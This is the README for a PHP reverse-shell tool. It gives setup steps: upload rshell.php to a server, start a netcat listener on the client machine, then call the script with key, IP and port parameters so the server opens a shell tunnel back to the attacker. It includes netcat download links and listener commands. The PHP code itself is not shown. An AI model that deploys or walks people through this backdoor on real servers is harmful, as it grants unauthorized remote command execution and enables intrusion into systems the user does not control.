php reverse shell

creates a reverse php shell...


install:
copy rshell.php to your server

run

http://localhost/reshell/rshell.php




on your client machine run

win32:
nc -l -p PORT -vvv

http://joncraton.org/files/nc111nt.zip


else:
netcat -l -p PORT -vvv

http://internap.dl.sourceforge.net/sourceforge/netcat/netcat-0.7.1.tar.gz



then connect...

http://localhost/rshell/SHELLNAME.php?key=KEY&ip=YOURIP&port=PORT

after the tunnel is created and the shell deamon is spawned close the browser window.

you will be left with a netcat shell reverse tunnel from the server to your machine

thats pretty much it...


- brad



